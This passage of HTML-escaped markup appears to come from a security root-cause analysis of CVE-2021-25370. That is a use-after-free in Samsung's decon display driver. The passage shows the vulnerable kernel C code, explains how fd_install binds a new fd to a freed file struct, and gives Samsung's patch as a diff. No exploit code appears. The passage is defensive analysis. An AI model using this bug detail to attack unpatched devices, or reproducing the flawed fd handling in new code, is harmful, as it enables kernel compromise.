class=\"vdnyYxSRCi-c4\"&gt;config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;].&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;state&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;rel_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;state &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;==&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;DECON_WIN_STATE_BUFFER&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;rel_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;decon_get_valid_fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;rel_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; decon_err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;%s: failed to get unused fd\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __func__&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;goto&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;fd_install&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;rel_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;get_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;].&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;rel_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;rel_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;while&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;--&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;].&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;state &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;==&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;DECON_WIN_STATE_BUFFER&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; put_unused_fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;].&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;rel_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;].&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;rel_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_create_release_fences&lt;/span&gt;&lt;span&gt;&amp;nbsp;gets a new fd, but then associates that new fd with the freed file struct, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sync_file-&amp;gt;file,&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the call to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;fd_install&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;When &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_set_win_config&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;retire_fence&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the closed fd that points to the freed file struct and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;rel_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;is the open fd that points to the freed file struct.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"vdnyYxSRCi-c8 vdnyYxSRCi-c52\" id=\"h.k6qkjz8un3r0\"&gt;&lt;span class=\"vdnyYxSRCi-c33 vdnyYxSRCi-c42\"&gt;Fixing the vulnerability&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Samsung fixed this use-after-free in March 2021 as CVE-2021-25370. The fix was to move the call to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;fd_install&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_set_win_config&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the latest possible point in the function after the call to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_create_release_fences&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1c8f2a2ff722387482b98ebe34bbd0555192a9e2\"&gt;&lt;/a&gt;&lt;a id=\"t.20\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;num_of_window&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c29\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c29\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fd_install&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c29\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c29\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c29\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c29\"&gt;retire_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c29\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c29\"&gt;&amp;nbsp;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c29\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c29\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c29\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; decon_create_release_fences&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#if !defined(CONFIG_SUPPORT_LEGACY_FENCE)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; regs&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;retire_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;dma_fence_get&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#endif&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; decon_hiber_block&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mutex_lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_add_tail&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;regs&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;list&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;list&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; atomic_inc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 